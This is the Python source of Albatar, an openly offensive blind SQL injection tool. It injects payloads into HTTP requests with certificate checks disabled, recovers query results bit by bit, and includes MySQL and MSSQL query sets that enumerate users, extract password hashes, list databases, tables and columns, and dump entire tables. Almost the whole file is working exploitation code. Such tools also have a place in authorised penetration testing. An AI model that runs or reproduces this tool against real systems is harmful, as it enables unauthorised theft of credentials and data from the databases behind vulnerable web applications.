#!/usr/bin/env python

# Copyright (C) 2015 Sebastien MACKE
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License version 2, as published by the
# Free Software Foundation
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details (http://www.gnu.org/licenses/gpl.txt).

__author__  = 'Sebastien Macke'
__email__   = 'lanjelot@gmail.com'
__url__     = 'https://github.com/lanjelot/albatar'
__twitter__ = 'https://twitter.com/lanjelot'
__version__ = 'n/a'
__license__ = 'GPLv2'
__banner__  = 'Albatar v%s (%s)' % (__version__, __url__)

# logging / imports / utils {{{
import logging

f1 = logging.Formatter('%(asctime)s %(name)s - %(message)s', datefmt='%H:%M:%S')
f2 = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %(message)s', datefmt='%H:%M:%S')

sh = logging.StreamHandler()
sh.setFormatter(f1)
sh.setLevel(logging.INFO)

fh = logging.FileHandler('albatar.log')
fh.setFormatter(f2)
fh.setLevel(logging.DEBUG)

logger = logging.getLogger('albatar')
logger.setLevel(logging.DEBUG)

logger.addHandler(sh)
logger.addHandler(fh)

from Queue import Queue
from time import sleep, time
from threading import Thread, active_count, current_thread
from urlparse import urlparse, urlunparse
from string import Template
import sys
import pycurl
from collections import OrderedDict
try:
  from cStringIO import StringIO
except ImportError:
  from StringIO import StringIO

def T(s, **kwargs):
  return Template(s).safe_substitute(**kwargs)

class Timing:
  def __enter__(self):
    self.t1 = time()
    return self

  def __exit__(self, exc_type, exc_value, traceback):
    self.time = time() - self.t1
# }}}

# Requester {{{
class Requester_HTTP:

  def __init__(self, state_tester, url, method='GET', body='', headers=[],
    auth_type='basic', auth_creds='', proxy='', ssl_cert='', encode_payload=lambda x: x):

    self.state_tester = state_tester
    self.http_opts = url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert
    self.encode_payload = encode_payload

    self.fp = pycurl.Curl()
    self.fp.setopt(pycurl.SSL_VERIFYPEER, 0)
    self.fp.setopt(pycurl.SSL_VERIFYHOST, 0)
    self.fp.setopt(pycurl.HEADER, 1)
    self.fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
    self.fp.setopt(pycurl.NOSIGNAL, 1)

  def test(self, payload):

    url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert = self.http_opts

    fp = self.fp
    fp.setopt(pycurl.PROXY, proxy)

    def noop(buf): pass
    fp.setopt(pycurl.WRITEFUNCTION, noop)

    def debug_func(t, s):
      if t == pycurl.INFOTYPE_HEADER_IN:
        header_buffer.write(s)

      elif t == pycurl.INFOTYPE_DATA_IN:
        response_buffer.write(s)

    header_buffer, response_buffer = StringIO(), StringIO()

    fp.setopt(pycurl.DEBUGFUNCTION, debug_func)
    fp.setopt(pycurl.VERBOSE, 1)

    if auth_creds:
      fp.setopt(pycurl.USERPWD, auth_creds)
      if auth_type == 'basic':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
      elif auth_type == 'digest':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_DIGEST)
      elif auth_type == 'ntlm':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
      else:
        raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
    
    if ssl_cert:
      fp.setopt(pycurl.SSLCERT, ssl_cert)

    scheme, host, path, params, query, fragment = urlparse(url)

    def sub(payload, *args):
      new = []
      for arg in args:
        new.append(arg.replace('${injection}', self.encode_payload(payload)))
      return new 

    query, body = sub(payload, query, body)

    method = method.upper()
    if method == 'GET':
      fp.setopt(pycurl.HTTPGET, 1)

    elif method == 'POST':
      fp.setopt(pycurl.POST, 1)
      fp.setopt(pycurl.POSTFIELDS, body)

      if 'Content-Type: ' not in '\n'.join(headers):
        headers.append('Content-Type: application/x-www-form-urlencoded')

    elif method == 'HEAD':
      fp.setopt(pycurl.NOBODY, 1)

    else:
      fp.setopt(pycurl.CUSTOMREQUEST, method)

    url = urlunparse((scheme, host, path, params, query, fragment))
    
    fp.setopt(pycurl.URL, url)
    fp.setopt(pycurl.HTTPHEADER, headers)
    fp.perform()

    http_code = fp.getinfo(pycurl.HTTP_CODE)
    content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
    response_time = fp.getinfo(pycurl.TOTAL_TIME) - fp.getinfo(pycurl.PRETRANSFER_TIME)
    header_data, response_data = header_buffer.getvalue(), response_buffer.getvalue()

    stats = '%d %d:%d %.3f' % (http_code, len(header_data+response_data), content_length, response_time)
    logger.debug('%s //%s' % (stats, payload))

    return self.state_tester(header_data, response_data, response_time)
# }}}

# Methods {{{
class Method_Base:

  def __init__(self, make_requester, template, num_threads=7):
    self.make_requester = make_requester
    self.template = template
    self.num_threads = num_threads

  def execute(self, query, start_offset, stop_offset):
    logger.info('Executing: %s' % repr(query))

    self.taskq = Queue()
    self.resultq = Queue()

    for i in range(self.num_threads):
      t = Thread(target=self.consume, args=())
      t.daemon = True
      t.start()

    start_index, stop_index = int(start_offset), int(stop_offset)

    if isinstance(query, basestring):
      self.query = query

    else:
      if stop_index == 1:
        self.query, _ = query
        stop_index = int(self.get_row())

      _, self.query = query

    logger.debug('retrieving %d rows, starting at row %d' % (stop_index-start_index, start_index))
      
    for row_index in range(start_index, stop_index):
      yield self.get_row(row_index)

  def get_row(self, row_pos): pass

  def make_payload(self, query, **kwargs):

    payload = T(self.template, query=query)
    for k, v in kwargs.iteritems():
      payload = T(payload, **kwargs)

    return payload

class Method_binary(Method_Base):
  '''Binary Search'''
  pass

class Method_bitwise(Method_Base):
  '''Bit ANDing'''

  def get_row(self, row_pos=0):

    logger.debug('query: %s' % self.query)

    result = ''
    char_pos = 1
    while True:

      for bit_pos in range(7):
        payload = self.make_payload(query=self.query, char_pos=char_pos, bit_pos=1<<bit_pos, row_pos=row_pos)
        self.taskq.put_nowait((bit_pos, payload))

      char = 0
      for _ in range(7):
        bit_pos, state = self.resultq.get()
        char |= state << bit_pos

      logger.debug('char: %d (%s)' % (char, repr(chr(char))))

      sys.stdout.write('%s' % chr(char))
      sys.stdout.flush()

      if char >= 127:
        continue

      if char == 0:
        break

      result += chr(char)
      char_pos += 1

    sys.stdout.write('\r')
    sys.stdout.flush()

    logger.debug('row %d: %s' % (row_pos, result))
    return result

  def consume(self):

    requester = self.make_requester()

    while True:
      task_id, payload = self.taskq.get()
      try_count = 0

      while True:
        try_count += 1

        try:
          state = requester.test(payload)
          self.resultq.put((task_id, state))

          break
        except:
          mesg = '%s %s' % sys.exc_info()[:2]
          logger.warn('try %d, caught: %s' % (try_count, mesg))

          sleep(try_count * 2)

          requester = self.make_requester()
          continue
# }}}

# Main {{{
class SQLi_Base:

  def __init__(self, method):
    self.method = method

  def exploit(self):

    from sys import argv
    from optparse import OptionParser, OptionGroup

    usage_str = """usage: %prog [options]
    $ %prog -q 'select version()'"""

    parser = OptionParser(usage=usage_str)

    parser.add_option('-d', '--debug', dest='debug', action='store_true', default=False, help='print debug messages')

    enumeration = OptionGroup(parser, 'Enumeration')
    enumeration.add_option('-q', '--query', dest='query', help='SQL statement to execute')
    enumeration.add_option('-b', '--banner', dest='banner', action='store_true', help='')
    enumeration.add_option('--current-user', dest='current_user', action='store_true', help='')
    enumeration.add_option('--current-db', dest='current_db', action='store_true', help='')
    enumeration.add_option('--hostname', dest='hostname', action='store_true', help='')

    enumeration.add_option('--users', dest='enum_users', action='store_true', help='')
    enumeration.add_option('--passwords', dest='enum_passwords', action='store_true', help='')
    #enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
    #enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')

    enumeration.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
    enumeration.add_option('--tables', dest='enum_tables', action='store_true')
    enumeration.add_option('--columns', dest='enum_columns', action='store_true')
    enumeration.add_option('--dump', dest='dump_table', action='store_true', help='')

    enumeration.add_option('-D', dest='db', default='', metavar='', help='')
    enumeration.add_option('-T', dest='table', default='', metavar='', help='')
    enumeration.add_option('-C', dest='column', default='', metavar='', help='')
    enumeration.add_option('-U', dest='user', default='', metavar='', help='')

    enumeration.add_option('--start', dest='start_offset', default='0', metavar='', help='')
    enumeration.add_option('--stop', dest='stop_offset', default='1', metavar='', help='')

    parser.option_groups.extend([enumeration])
    (opts, args) = parser.parse_args(argv[1:])

    queries = []

    if opts.banner:
      queries.append(self.banner())

    if opts.current_user:
      queries.append(self.current_user())

    if opts.current_db:
      queries.append(self.current_db())

    if opts.hostname:
      queries.append(self.hostname())

    if opts.enum_users:
      queries.append(self.enum_users())

    if opts.enum_passwords:
      for user in opts.user.split(','):
        queries.append(self.enum_passwords(user))

    if opts.enum_dbs:
      queries.append(self.enum_dbs())

    if opts.enum_tables:
      for db in opts.db.split(','):
        queries.append(self.enum_tables(opts.db))

    if opts.enum_columns:
      for table in opts.table.split(','):
        queries.append(self.enum_columns(opts.db, opts.table))

    if opts.dump_table:
      queries.append(self.dump_table(opts.db, opts.table, opts.column.split(',')))

    if opts.query:
      queries.append(opts.query)

    with Timing() as timing:
      for query in queries:
        for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
          yield result

    logger.info("Time: %.2f seconds" % (timing.time))

# }}}

# MySQL {{{
class MySQL_Blind(SQLi_Base):
  
  def banner(self):
    return 'SELECT @@VERSION'

  def current_user(self):
    return 'SELECT USER()'

  def current_db(self):
    return 'SELECT DATABASE()'

  def hostname(self):
    return 'SELECT @@HOSTNAME'

  def enum_users(self):
    c = 'SELECT COUNT(DISTINCT(user)) FROM mysql.user'
    q = 'SELECT DISTINCT(user) FROM mysql.user LIMIT ${row_pos},1'
    return c, q

  def enum_passwords(self, user):
    if not user:
      raise NotImplementedError('-U required')

    c = "SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user='%s'" % user
    q = "SELECT DISTINCT(password) FROM mysql.user WHERE user='%s' LIMIT ${row_pos},1" % user
    return c, q

  def enum_dbs(self):
    c = 'SELECT COUNT(schema_name) FROM information_schema.schemata'
    q = 'SELECT schema_name FROM information_schema.schemata LIMIT ${row_pos},1'
    return c, q

  def enum_tables(self, db):
    if db:
      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema="%s"' % db
      q = 'SELECT table_name FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},1' % db
    else:
      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")'
      q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name) FROM information_schema.tables WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
    return c, q

  def enum_columns(self, db, table):
    if db:
      if table:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s"' % (db, table)
        q = 'SELECT column_name FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},1' % (db, table)
      else:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s"' % db
        q = 'SELECT CONCAT_WS(0x3a,table_name,column_name) FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},1' % db
    else:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")'
        q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
    return c, q

  def dump_table(self, db, table, cols):
    c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
    q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols), db, table)
    return c, q
# }}}

# MSSQL {{{
class MSSQL_Blind(SQLi_Base):

  def banner(self):
    return 'SELECT @@VERSION'

  def current_user(self):
    return 'SELECT SYSTEM_USER'

  def current_db(self):
    return 'SELECT DB_NAME()'

  def hostname(self):
    return 'SELECT @@SERVERNAME'

  def enum_users(self):
    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins'
    q = 'SELECT TOP 1 name FROM master..syslogins WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins ORDER BY name) ORDER BY name'
    return c, q

  def enum_passwords(self, user):
    if not user:
      raise NotImplementedError('-U required')

    c = T("SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='${user}'", user=user)
    q = T("SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='${user}'"\
        " AND password_hash NOT IN (SELECT TOP ${row_pos} password_hash FROM sys.sql_logins WHERE name='${user}' ORDER BY password_hash)" \
        " ORDER BY password_hash", user=user)
    return c, q

  def enum_dbs(self):
    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases'
    q = 'SELECT TOP 1 name FROM master..sysdatabases WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases ORDER BY name) ORDER BY name'
    return c, q

  def enum_tables(self, db):
    if not db:
      raise NotImplementedError('-D required')

    c = T("SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE xtype = 'U'", db=db)
    q = T("SELECT TOP 1 name FROM ${db}..sysobjects WHERE xtype = 'U'" \
          " AND name NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype = 'U' ORDER BY name) ORDER BY name", db=db)
    return c, q

  def enum_columns(self, db, table):
    if not db:
      raise NotImplementedError('-D required')
    if not table:
      raise NotImplementedError('-T required')

    c = T("SELECT LTRIM(STR(COUNT(x.name))) FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'", db=db, table=table)
    q = T("SELECT TOP 1 x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' AND x.name" \
          " NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' ORDER BY x.name)" \
          " ORDER BY x.name", db=db, table=table)
    return c, q

  def dump_table(self, db, table, cols):
    if not db:
      raise NotImplementedError('-D required')
    if not table:
      raise NotImplementedError('-T required')
    if not cols:
      raise NotImplementedError('-C required')

    c = T("SELECT LTRIM(STR(COUNT(*))) FROM ${db}..${table}", db=db, table=table)
    q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+':'+".join(cols), table=table, db=db)
    return c, q
# }}}

# vim: ts=2 sw=2 sts=2 et fdm=marker
